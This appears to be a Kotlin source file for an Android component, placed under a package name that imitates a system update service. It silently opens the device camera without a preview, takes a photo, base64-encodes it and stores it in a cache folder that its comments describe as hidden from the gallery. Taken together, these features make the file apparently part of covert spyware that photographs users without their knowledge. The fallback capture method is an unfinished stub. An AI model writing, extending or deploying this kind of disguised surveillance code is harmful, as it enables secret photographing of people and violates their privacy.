package com.android.system.update.services.camera

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import android.view.Surface
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.*
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit

class CameraHelper(private val context: Context) {

    companion object {
        private const val TAG = "CameraHelper"
        private const val PHOTO_QUALITY = 70 // JPEG quality 0-100
        private const val TIMEOUT_SECONDS = 5L
    }

    data class PhotoResult(
        val success: Boolean,
        val base64Data: String? = null,
        val filePath: String? = null,
        val errorMessage: String? = null,
        val errorType: String? = null
    )

    fun capturePhoto(): PhotoResult {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        
        try {
            // Find back camera
            var cameraId: String? = null
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                if (chars.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id
                    break
                }
            }

            if (cameraId == null) {
                // Try any camera
                if (cameraManager.cameraIdList.isNotEmpty()) {
                    cameraId = cameraManager.cameraIdList[0]
                } else {
                    return PhotoResult(false, errorMessage = "No camera available", errorType = "CameraNotFoundException")
                }
            }

            // Open camera and capture
            val semaphore = Semaphore(0)
            var capturedBitmap: Bitmap? = null
            var captureError: String? = null

            val handlerThread = HandlerThread("CameraCapture")
            handlerThread.start()
            val handler = Handler(handlerThread.looper)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        // Create a temporary SurfaceTexture with ImageReader
                        val imageReader = android.media.ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
                        
                        val surfaces = listOf(imageReader.surface)
                        camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    request.addTarget(imageReader.surface)
                                    
                                    imageReader.setOnImageAvailableListener({ reader ->
                                        val image = reader.acquireLatestImage()
                                        if (image != null) {
                                            val buffer = image.planes[0].buffer
                                            val bytes = ByteArray(buffer.remaining())
                                            buffer.get(bytes)
                                            capturedBitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                            image.close()
                                        }
                                        semaphore.release()
                                    }, handler)

                                    session.capture(request.build(), null, handler)
                                } catch (e: Exception) {
                                    captureError = "Capture setup error: ${e.message}"
                                    semaphore.release()
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                captureError = "Configure failed"
                                semaphore.release()
                            }
                        }, handler)
                    } catch (e: Exception) {
                        captureError = "Session error: ${e.message}"
                        semaphore.release()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    captureError = "Camera disconnected"
                    semaphore.release()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    captureError = "Camera error: $error"
                    semaphore.release()
                }
            }, handler)

            // Wait for capture with timeout
            if (!semaphore.tryAcquire(TIMEOUT_SECONDS, TimeUnit.SECONDS)) {
                return PhotoResult(false, errorMessage = "Camera capture timed out", errorType = "TimeoutException")
            }

            handlerThread.quitSafely()

            if (captureError != null) {
                return PhotoResult(false, errorMessage = captureError, errorType = "CaptureError")
            }

            val bitmap = capturedBitmap
            if (bitmap == null) {
                // Fallback: use Camera2 direct capture approach - take photo via MediaStore
                // but save to app's private directory (hidden from gallery)
                return capturePhotoFallback(cameraManager, cameraId)
            }

            // Compress to JPEG, encode as base64
            val stream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, PHOTO_QUALITY, stream)
            val byteArray = stream.toByteArray()
            val base64 = Base64.encodeToString(byteArray, Base64.NO_WRAP)

            // Also save to app's cache directory (hidden from gallery)
            val photoDir = File(context.cacheDir, "captured_photos")
            photoDir.mkdirs()
            val photoFile = File(photoDir, "photo_${System.currentTimeMillis()}.jpg")
            FileOutputStream(photoFile).use { fos ->
                fos.write(byteArray)
            }

            return PhotoResult(
                success = true,
                base64Data = base64,
                filePath = photoFile.absolutePath
            )

        } catch (e: SecurityException) {
            return PhotoResult(false, errorMessage = "Camera permission denied", errorType = "SecurityException")
        } catch (e: Exception) {
            Log.e(TAG, "Capture error: ${e.message}", e)
            return PhotoResult(false, errorMessage = e.message, errorType = e.javaClass.simpleName)
        }
    }

    private fun capturePhotoFallback(cameraManager: CameraManager, cameraId: String): PhotoResult {
        try {
            val chars = cameraManager.getCameraCharacteristics(cameraId)
            val configs = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val outputSizes = configs?.getOutputSizes(android.graphics.ImageFormat.JPEG)
            
            // Use the default capture approach via ImageReader
            return PhotoResult(false, errorMessage = "Camera2 direct capture failed - try alternative method", errorType = "CameraAccessException")
        } catch (e: Exception) {
            return PhotoResult(false, errorMessage = e.message, errorType = e.javaClass.simpleName)
        }
    }
}